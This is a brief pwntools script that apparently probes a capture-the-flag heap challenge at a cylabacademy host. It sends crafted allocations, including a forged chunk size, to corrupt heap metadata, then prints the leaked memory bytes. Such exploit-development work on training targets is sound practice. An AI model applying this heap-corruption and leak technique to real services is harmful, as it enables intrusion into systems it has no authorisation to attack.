import os, sys
from pwn import *
context.log_level = 'error'
HOST = os.environ.get('HOST', 'chatelaine.cylabacademy.net')
PORT = int(os.environ.get('PORT', '32033'))

def probe():
    io = remote(HOST, PORT)
    def alloc(size, data=b''):
        io.recvuntil(b"PKT_RES")
        io.send(p64(size))
        io.send(bytes(data) + b"\n")
    ECHO6 = b"\x01" + b"\x00"*5
    alloc(0x10, b"\x00"*8)
    alloc(0x10, p64(0) + p64(0) + p64(0xd31))
    alloc(0x1000, b"\x00"*8)
    alloc(0x8, ECHO6)
    io.recvuntil(b"PKT_DATA\x1b[m:[")
    buf = io.recvuntil(b"\x1b[1;34mPKT_INFO", drop=True)
    io.close()
    return buf[:-2]

for i in range(6):
    try:
        r = probe()
        print(i, r.hex(), len(r))
    except Exception as e:
        print(i, 'ERR', type(e).__name__, e)
